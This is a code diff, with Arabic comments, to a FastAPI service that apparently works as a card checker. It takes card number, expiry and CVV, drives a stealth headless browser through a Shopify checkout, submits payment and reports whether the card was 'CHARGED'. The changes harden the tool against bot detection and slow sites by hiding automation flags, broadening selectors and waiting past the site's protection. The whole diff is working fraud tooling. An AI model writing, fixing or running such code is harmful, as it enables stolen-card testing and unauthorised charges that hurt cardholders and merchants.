@@ -8,7 +8,12 @@ app = FastAPI()
 @app.get("/check")
 async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = Query(None)):
     async with async_playwright() as p:
-        browser = await p.chromium.launch(args=["--no-sandbox", "--disable-dev-shm-usage"])
+        # إقلاع المتصفح مع تحسين استهلاك الذاكرة في الاستضافات السحابية
+        browser = await p.chromium.launch(args=[
+            "--no-sandbox", 
+            "--disable-dev-shm-usage",
+            "--disable-blink-features=AutomationControlled"
+        ])
         
         context_args = {
             "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
@@ -20,40 +25,65 @@ async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = 
         context = await browser.new_context(**context_args)
         page = await context.new_page()
         
-        # تطبيق إضافة Stealth لإخفاء بصمة الأتمتة
+        # تفعيل وضع التخفي لحماية السكربت من التجمد
         await stealth_async(page)
         
         try:
-            await page.goto(f"{site}/checkout", timeout=60000, wait_until="networkidle")
+            # فتح الرابط مع مهلة مرنة جداً (90 ثانية) لتفادي بطء الخوادم
+            await page.goto(f"{site}/checkout", timeout=90000, wait_until="load")
             
-            # ملء بيانات العميل
-            await page.locator('input[type="email"], input[name*="email"]').first.fill("user@example.com")
-            await page.locator('input[name*="firstName"], input[placeholder*="First name"]').first.fill("John")
-            await page.locator('input[name*="lastName"], input[placeholder*="Last name"]').first.fill("Doe")
-            await page.locator('input[name*="address1"], input[placeholder*="Address"]').first.fill("123 Street")
+            # انتظر حتى تظهر أي مدخلات في الصفحة للتأكد من تجاوز جدار الحماية
+            await page.wait_for_selector('input', timeout=30000)
             
-            # الانتقال لخطوة الدفع
-            await page.locator('button[type="submit"], button:has-text("Continue")').first.click()
-            await page.wait_for_load_state("networkidle", timeout=15000)
+            # تعبئة بيانات الشحن عبر أنماط مرنة للغاية
+            email_field = page.locator('input[type="email"], input[name*="email"], input[placeholder*="Email"]').first
+            await email_field.fill("user@example.com")
             
+            first_name = page.locator('input[name*="firstName"], input[placeholder*="First name"]').first
+            await first_name.fill("John")
+            
+            last_name = page.locator('input[name*="lastName"], input[placeholder*="Last name"]').first
+            await last_name.fill("Doe")
+            
+            address_field = page.locator('input[name*="address1"], input[placeholder*="Address"]').first
+            await address_field.fill("123 Street")
+            
+            # الضغط على زر المتابعة الأول مع انتظار تحميل الصفحة التالية
+            submit_btn = page.locator('button[type="submit"], button:has-text("Continue")').first
+            await submit_btn.click()
+            await page.wait_for_load_state("domcontentloaded")
+            
+            # محاولة تخطي خطوة اختيار طريقة الشحن بمرونة زمنية قصيرة
             try:
-                await page.locator('button:has-text("Continue to payment")').click(timeout=5000)
+                payment_btn = page.locator('button:has-text("Continue to payment"), button[type="submit"]').first
+                await payment_btn.click(timeout=10000)
                 await page.wait_for_load_state("networkidle", timeout=15000)
             except:
+                # إذا لم تكن الخطوة موجودة، يتجاوزها الكود فوراً دون تعليق
                 pass
 
-            # التعامل مع حقول الدفع
-            await page.wait_for_selector('iframe[title*="payment"]', timeout=20000)
-            frame = page.frame_locator('iframe[title*="payment"]')
+            # الوصول الآمن للـ Iframe مع إعطائه مهلة كافية للبناء الديناميكي
+            iframe_selector = 'iframe[title*="payment"], iframe[title*="Secure card"]'
+            await page.wait_for_selector(iframe_selector, timeout=40000)
+            frame = page.frame_locator(iframe_selector)
             
-            await frame.locator('input[name*="number"]').fill(cc.split('|')[0])
-            await frame.locator('input[name*="expiry"]').fill(f"{cc.split('|')[1]}/{cc.split('|')[2]}")
-            await frame.locator('input[name*="verification_value"]').fill(cc.split('|')[3])
+            # تعبئة بيانات الكرت
+            cc_parts = cc.split('|')
+            await frame.locator('input[name*="number"]').fill(cc_parts[0])
+            await frame.locator('input[name*="expiry"]').fill(f"{cc_parts[1]}/{cc_parts[2]}")
+            await frame.locator('input[name*="verification_value"]').fill(cc_parts[3])
             
-            await page.locator('button#continue-button, button:has-text("Pay now")').first.click()
-            await page.wait_for_load_state("networkidle", timeout=15000)
+            # ضغط زر الدفع النهائي والانتظار حتى حسم النتيجة
+            final_btn = page.locator('button#continue-button, button:has-text("Pay now"), button[type="submit"]').first
+            await final_btn.click()
             
-            status = "true" if "thank-you" in page.url or "success" in page.content().lower() else "false"
+            # مهلة معالجة عملية الحسم البنكية
+            await page.wait_for_load_state("networkidle", timeout=30000)
+            
+            # قراءة النتيجة النهائية
+            content = page.content().lower()
+            status = "true" if "thank-you" in page.url or "success" in content else "false"
+            
             await browser.close()
             return {"Gateway": "Shopify Payments", "Response": "CHARGED" if status == "true" else "CARD_DECLINED", "Status": status, "CC": cc}
             
